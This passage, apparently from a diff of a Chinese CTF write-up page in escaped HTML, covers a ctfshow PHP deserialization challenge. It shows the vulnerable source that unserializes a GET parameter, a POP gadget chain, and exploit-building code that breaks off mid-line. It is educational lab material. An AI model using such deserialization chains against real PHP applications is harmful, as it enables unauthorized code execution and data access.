-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;afd4b9668ced586e2528dc1863a650fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;c1&#34;&gt;# 不能数字开头
-&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;	&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;__construst&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(){&lt;/span&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;./HappyYear.php&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;				&lt;span class=&#34;c1&#34;&gt;// flag文件
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;one&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$object&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;MeMeMe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;array_walk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$fn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$prev&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;){&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$fn&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Happy_func&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$prev&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;===&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;year_parm&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$talk&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;si&#34;&gt;$talk&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;lt;/br&amp;gt;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;global&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;                &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$flag&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;            &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;p&#34;&gt;});&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__destruct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;add&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__toString&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$s&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;afd4b9668ced586e2528dc1863a650fd&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;serialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$s&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
 &lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;# O:32:&amp;#34;afd4b9668ced586e2528dc1863a650fd&amp;#34;:0:{}
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;second&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;protected&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;addMe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;k&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Wow you have sovled&amp;#34;&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;filename&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt; 		&lt;span class=&#34;c1&#34;&gt;// 字符和对象进行拼接 可以触发one()::__toString()
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__call&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nx&#34;&gt;call_user_func&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;([&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$func&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;Me&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;],&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$args&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;	 		&lt;span class=&#34;c1&#34;&gt;// 接受不存在的属性名和值，拼接然后通过call_user_func() 函数调用内部
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;third&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;private&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__construct&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;string&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$string&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;public&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;fm&#34;&gt;__get&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;)&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;        &lt;span class=&#34;nv&#34;&gt;$var&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;	&lt;span class=&#34;c1&#34;&gt;// $name为外部传的值
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;        &lt;span class=&#34;nv&#34;&gt;$var&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$name&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]();&lt;/span&gt;			&lt;span class=&#34;c1&#34;&gt;// 数组调用类
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;    &lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt; 
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;k&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ctfshow&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]))&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;unserialize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ctfshow&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;k&#34;&gt;throw&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Exception&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;高一新生报道&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt; &lt;span class=&#34;c1&#34;&gt;// 抛出异常会停止所有操作
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;else&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;    &lt;span class=&#34;nx&#34;&gt;highlight_file&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;no&#34;&gt;__FILE__&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;p&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
+&lt;/div&gt;
+&lt;/div&gt;&lt;p&gt;POP链子：&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;one::__destruct =&amp;gt; second::__call=&amp;gt; second::addMe =&amp;gt; one::__toString =&amp;gt; third::__get =&amp;gt; one::MeMeMe&lt;/strong&gt;&lt;/p&gt;
+&lt;p&gt;因为异常抛出的原因，需要通过gc垃圾回收提前触发析构函数(&lt;code&gt;__destruct()&lt;/code&gt;)&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
+&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
+&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
+&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
+&lt;td class=&#34;lntd&#34;&gt;
+&lt;pre tabindex=&#34;0&#34; class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;one&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;object&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;second&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;filename&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;one&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;o&#34;&gt;@&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;object&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;filename&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;object&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;third&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;string&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&amp;gt;&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;one&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(),&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;MeMeMe&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]));&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;cl&#34;&gt;&lt;span class=&#34;nv&#34;&gt;$b&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;array&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$a&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;NULL&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;		&lt;span class=&#34;c1&#34;&gt;// 置空数组
